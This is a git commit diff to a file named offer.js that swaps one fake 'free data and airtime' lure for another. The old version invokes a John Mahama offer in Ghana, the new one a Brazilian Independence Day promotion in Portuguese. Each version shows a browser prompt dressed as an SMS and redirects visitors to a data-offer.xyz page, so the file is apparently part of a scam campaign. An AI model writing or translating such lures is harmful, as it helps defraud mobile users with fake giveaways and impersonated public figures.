9d24af35db4c48690610c27327bd0eb969e0b2d0
decullian <decullianresort@gmail.com>
2024-09-04 01:07:53 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '50GB e Recarga de R$35'
+password=prompt('SMS: Parabéns, você está qualificado para receber 50 GB e recarga de R$ 35 na oferta do Dia da Independência. Pressione OK para ATIVAR ','50GB e Recarga de R$35');
+if (password != '50GB e Recarga de R$35') {
+location.href='http://independence.data-offer.xyz/50GB';
 }
